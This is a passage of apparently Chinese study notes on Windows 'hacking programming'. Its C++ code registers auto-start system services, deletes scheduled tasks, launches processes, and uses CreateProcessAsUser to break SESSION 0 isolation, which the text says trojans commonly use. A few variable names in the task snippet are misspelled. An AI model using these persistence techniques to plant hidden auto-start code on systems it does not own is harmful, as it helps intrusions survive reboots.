*pRegisteredTask = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-function">CComVariant <span class="hljs-title">variantTaskName</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>    variantTaskName = lpszTaskName;<br>    hr = m_lpRootFolder-&gt;<span class="hljs-built_in">RegisterTaskDefinition</span>(variantTaskName.bstrVal, pTaskDefinition, TASK_CREATE_OR_UPDATE, <span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>(),<br>                            TASK_LOGON_INTERACTIVE_TOKEN, <span class="hljs-type">_variant_t</span>(<span class="hljs-string">&quot;&quot;</span>), &amp;pRegisterdTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        pTaskDefinition-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskFolder::RegisterTaskDefinition&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    pTaskDefiinition-&gt;<span class="hljs-built_in">Release</span>();<br>    pRegisteredTask-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3-删除计划任务操作"><a href="#3-删除计划任务操作" class="headerlink" title="3.删除计划任务操作"></a><strong>3.删除计划任务操作</strong></h5><p>ITaskFolder对象存储着已经注册成功的任务计划信息，程序只需要调用DeleteTask接口函数，并将任务计划的名称传入其中，就可以删除指定名称的计划任务了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CMyTaskSchedule::Delete</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszTaskName)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpszTaskName)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-function">CComVariant <span class="hljs-title">variantTaskName</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>    variantTaskName = lpszTaskName;<br>    HRESULT hr = m_lpRootFolder-&gt;<span class="hljs-built_in">DeleteTask</span>(variantTaskName.bstrVal, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="系统服务"><a href="#系统服务" class="headerlink" title="系统服务"></a>系统服务</h3><p>系统进程自启动是通过创建系统服务并设置服务启动类型为自动启动来实现的。</p><h4 id="实现原理及代码-1"><a href="#实现原理及代码-1" class="headerlink" title="实现原理及代码"></a><strong>实现原理及代码</strong></h4><h5 id="1-创建启动系统服务"><a href="#1-创建启动系统服务" class="headerlink" title="1.创建启动系统服务"></a><strong>1.创建启动系统服务</strong></h5><p>​首先通过OpenSCManager函数打开服务控制管理器数据库并获取数据库的句柄。<br>​若要创建服务，则调用CreateService开始创建服务，指明创建的服务类型是SERVICE_WIN32_OWN_PROCESS系统服务，同时设置SERVICE_AUTO_START为开机自启动；若是其他操作，则调用OpenService打开服务，获取服务句柄。<br>​接着根据服务句柄考虑以下操作，若操作是启动，则使用StartService启动服务；若操作是停止，则使用ControlService停止服务；若操作是删除，则使用DeleteService删除服务。<br>​最后，关团服务柄和服务控制管理器数据库柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 0 加载服务    1 启动服务    2 停止服务    3 删除服务</span><br><span class="hljs-function">BOOL <span class="hljs-title">SystemServiceOperate</span><span class="hljs-params">(<span class="hljs-type">char</span> *lpszDriverPath, <span class="hljs-type">int</span> iOperateType)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = TRUE;<br><span class="hljs-type">char</span> szName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><br>::<span class="hljs-built_in">lstrcpy</span>(szName, lpszDriverPath);<br><span class="hljs-comment">// 过滤掉文件目录，获取文件名</span><br>::<span class="hljs-built_in">PathStripPath</span>(szName);                   <br><br>SC_HANDLE shOSCM = <span class="hljs-literal">NULL</span>, shCS = <span class="hljs-literal">NULL</span>;<br>SERVICE_STATUS ss;<br>DWORD dwErrorCode = <span class="hljs-number">0</span>;<br>BOOL bSuccess = FALSE;<br><span class="hljs-comment">// 打开服务控制管理器数据库</span><br>shOSCM = ::<span class="hljs-built_in">OpenSCManager</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, SC_MANAGER_ALL_ACCESS);<br><span class="hljs-keyword">if</span> (!shOSCM)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenSCManager&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != iOperateType)<br>&#123;<br><span class="hljs-comment">// 打开一个已经存在的服务</span><br>shCS = <span class="hljs-built_in">OpenService</span>(shOSCM, szName, SERVICE_ALL_ACCESS);<br><span class="hljs-keyword">if</span> (!shCS)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenService&quot;</span>);<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shOSCM);<br>shOSCM = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (iOperateType)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>&#123;<br><span class="hljs-comment">// 创建服务</span><br><span class="hljs-comment">// SERVICE_AUTO_START   随系统自动启动</span><br><span class="hljs-comment">// SERVICE_DEMAND_START 手动启动</span><br>shCS = ::<span class="hljs-built_in">CreateService</span>(shOSCM, szName, szName,<br>SERVICE_ALL_ACCESS,<br>SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,<br>SERVICE_AUTO_START,<br>SERVICE_ERROR_NORMAL,<br>lpszDriverPath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!shCS)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>&#123;<br><span class="hljs-comment">// 启动服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">StartService</span>(shCS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;StartService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>&#123;<br><span class="hljs-comment">// 停止服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ControlService</span>(shCS, SERVICE_CONTROL_STOP, &amp;ss))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ControlService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>&#123;<br><span class="hljs-comment">// 删除服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">DeleteService</span>(shCS))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;DeleteService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 关闭句柄</span><br><span class="hljs-keyword">if</span> (shCS)<br>&#123;<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shCS);<br>shCS = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (shOSCM)<br>&#123;<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shOSCM);<br>shOSCM = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-系统服务程序的编写"><a href="#2-系统服务程序的编写" class="headerlink" title="2.系统服务程序的编写"></a><strong>2.系统服务程序的编写</strong></h5><p>自启动服务程序并不是普通的程序，而是要求程序创建服务入口点函数，否则，不能创建系统服务。</p><p>调用系统函数StartServiceCtrlDispatcher将程序主线程 连接到 服务控制管理程序（其中定义了服务人口点函数是ServiceMain）。服务控制管理程序启动服务程序后，等待服务程序主函数调用StartServiceCtrlDispatcher函数。</p><p>服务程序main入口函数的代码如下所示。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-comment">// 注册服务入口函数</span><br>SERVICE_TABLE_ENTRY stDispatchTable[] = &#123; &#123; g_szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain &#125;, &#123; <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span> &#125; &#125;;<br>::<span class="hljs-built_in">StartServiceCtrlDispatcher</span>(stDispatchTable);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行服务初始化任务（同时执行的多个服务有多个入口点函数），首先调用RegisterServiceCtrlHandler定义控制处理程序函数（本例中是ServiceCtrlHandle），初始化后通过SetServiceStatus设定运行状态，然后运行服务代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">ServiceMain</span><span class="hljs-params">(DWORD dwArgc, <span class="hljs-type">char</span> *lpszArgv)</span></span><br><span class="hljs-function"></span>&#123;<br>g_ServiceStatusHandle = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(g_szServiceName, ServiceCtrlHandle);<br><br><span class="hljs-built_in">TellSCM</span>(SERVICE_START_PENDING, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">TellSCM</span>(SERVICE_RUNNING, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 自己程序实现部分代码放在这里</span><br><span class="hljs-comment">// !!注意!! 此处一定要为死循环, 否则在关机再开机的情况(不是点击重启), 不能创建用户进程</span><br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">5000</span>);<br><span class="hljs-built_in">DoTask</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows黑客编程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启动技术</title>
    <link href="/2022/10/31/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/10/31/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="第四章-启动技术"><a href="#第四章-启动技术" class="headerlink" title="第四章 启动技术"></a>第四章 启动技术</h2><h3 id="创建进程API"><a href="#创建进程API" class="headerlink" title="创建进程API"></a><strong>创建进程API</strong></h3><p>在一个进程中创建并启动一个新进程，最简单的方法无非是直接通过调用WIN32 API函数创建新进程。用户层上，微软提供了WinExec、ShellExecute和CreateProcess等函数来实现进程创建。</p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a>、<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/shellapi/nf-shellapi-shellexecutea">ShellExecute</a>以及<a href="https://learn.microsoft.com/en-us/previous-versions/aa908775(v=msdn.10)">CreateProcess</a>除了可以创建进程外，还能执行CMD命令等功能。</p><p><strong>代码实现</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;SDKDDKVer.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">WinExec_Test</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszExePath, UINT uiCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>UINT uiRet = <span class="hljs-number">0</span>;<br>uiRet = ::<span class="hljs-built_in">WinExec</span>(pszExePath, uiCmdShow);<br><span class="hljs-keyword">if</span> (<span class="hljs-number">31</span> &lt; uiRet)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">ShellExecute_Test</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszExePath, UINT uiCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>HINSTANCE hInstance = <span class="hljs-number">0</span>;<br>hInstance = ::<span class="hljs-built_in">ShellExecute</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, pszExePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, uiCmdShow);<br><span class="hljs-keyword">if</span> (<span class="hljs-number">32</span> &lt; (DWORD)hInstance)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">CreateProcess_Test</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszExePath, UINT uiCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi;<br>BOOL bRet = FALSE;<br>si.cb = <span class="hljs-built_in">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;  <span class="hljs-comment">//指定wShowWindow成员有效</span><br>si.wShowWindow = uiCmdShow;<br>bRet = ::<span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, pszExePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-comment">//不使用的句柄最好关掉</span><br>::<span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>::<span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>BOOL bRet = FALSE;<br><span class="hljs-comment">// WinExec.exe</span><br>bRet = <span class="hljs-built_in">WinExec_Test</span>(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\WinExec.exe&quot;</span>, SW_SHOWNORMAL);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WinExec.exe Run OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WinExec.exe Run ERROR.\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// ShellExecute.exe</span><br>bRet = <span class="hljs-built_in">ShellExecute_Test</span>(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\ShellExecute.exe&quot;</span>, SW_SHOWNORMAL);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute.exe Run OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute.exe Run ERROR.\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// CreateProcess.exe</span><br>bRet = <span class="hljs-built_in">CreateProcess_Test</span>(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\CreateProcess.exe&quot;</span>, SW_SHOWNORMAL);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess.exe Run OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess.exe Run ERROR.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="突破SESSION-0隔离创建用户进程-创建服务"><a href="#突破SESSION-0隔离创建用户进程-创建服务" class="headerlink" title="突破SESSION 0隔离创建用户进程(+创建服务)"></a><strong>突破SESSION 0隔离创建用户进程</strong>(+创建服务)</h3><p>病毒木马通常会把自已注入系统服务进程或是伪装成系统服务进程，并运行在SESSION 0中。处于SESSION 0中的程序能正常执行普通程序的绝大部分操作，但是个别操作除外。例如，处于SESSION 0中的系统服务进程，无法与普通用户进程通信，不能通过Windows消息机制进行通信，更不能创建普通的用户进程。</p><p>从Windows VISTA开始，<strong>只有服务可以托管到SESSION 0中，用户应用程序和服务之间会进行隔离</strong>。虽然Windows7及以上版本的SESSION 0给服务层和应用层间的通信造成了很大的难度，但这并不代表没有办法实现服务层与应用层间的通信与交互。微软提供了一系列以<strong>WTS（Windows Terminal Service，Windows终端服务）</strong>开头的函数，从而可以完成服务层与应用层的交互。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a><strong>实现原理</strong></h4><p>由于SESSION 0的隔离，使得在系统服务进程内不能直接调用CreateProcess等函数创建进程，而只能通过<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a>函数来创建。这样，创建的进程才会显示UI界面，与用户进行交互。</p><p><strong>在SESSION 0中创建用户桌面进程具体的实现流程如下所示：</strong></p><p>首先，调用<em><strong>WTSGetActiveConsoleSessionId</strong></em>函数来获取当前程序的会话ID，即Session  Id。根据Session  Id继续调用<em><strong>WTSQueryUserToken</strong></em>函数来检索用户令牌，并获取对应的用户令牌句柄。在不需要使用用户令牌句柄时，可以调用<em>CloseHandle</em>函数来释放句柄。</p><p>其次，使用<em><strong>DuplicateTokenEx</strong></em>函数创建一个新令牌，并复制上面获取的用户令牌。设置新令牌的访问权限为MAXIMUM_ALLOWED，这表示获取所有令牌权限。新访问令牌的模拟级别为SecurityIdentification，而且令牌类型为TokenPrimary，这表示新令牌是可以在<em><strong>CreateProcessAsUser</strong></em>函数中使用的主令牌。</p><p>最后，根据新令牌调用<em><strong>CreateEnvironmentBlock</strong></em>函数创建一个环境块，用来传递给<em><strong>CreateProcessAsUser</strong></em>使用。在不需要使用进程环境块时，可以通过调用<em><strong>DestroyEnvironmentBlock</strong></em>函数进行释放。获取环境块后，就可以调用<em><strong>CreateProcessAsUser</strong></em>来创建用户桌面进程。</p><p>上述方法创建的用户桌面进程并没有继承服务程序的系统权限，只具有<strong>普通权限</strong>。要想创建一个有系统权限的子进程，这可以通过设置进程访问令牌的安全描述符来实现。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a><strong>代码实现</strong></h4><p>因为程序要实现的是突破SESSION 0隔离，所以，在系统服务程序中创建用户桌面进程<strong>程序必须注册成为一个系统服务进程</strong>，这样才处于SESSION 0中。</p><p>服务程序的入口点与普通程序的人口点不同，需要通过调用函数<em>StartServiceCtrlDispatcher</em>来设置服务人口点函数。</p><p><strong>ServiceLoader.exe</strong></p><p>ServiceOperate.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _SERVICE_OPERATE_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _SERVICE_OPERATE_H_</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Shlwapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Shlwapi.lib&quot;</span>)</span><br><span class="hljs-comment">// 0 加载服务    1 启动服务    2 停止服务    3 删除服务</span><br><span class="hljs-function">BOOL <span class="hljs-title">SystemServiceOperate</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszDriverPath, <span class="hljs-type">int</span> iOperateType)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>ServiceLoader.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ServiceLoader.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ServiceOperate.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>BOOL bRet = FALSE;<br><span class="hljs-type">char</span> szExePath[] = <span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\CreateProcessAsUser.exe&quot;</span>;<br><br><span class="hljs-comment">// 加载服务</span><br>bRet = <span class="hljs-built_in">SystemServiceOperate</span>(szExePath, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INSTALL OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INSTALL 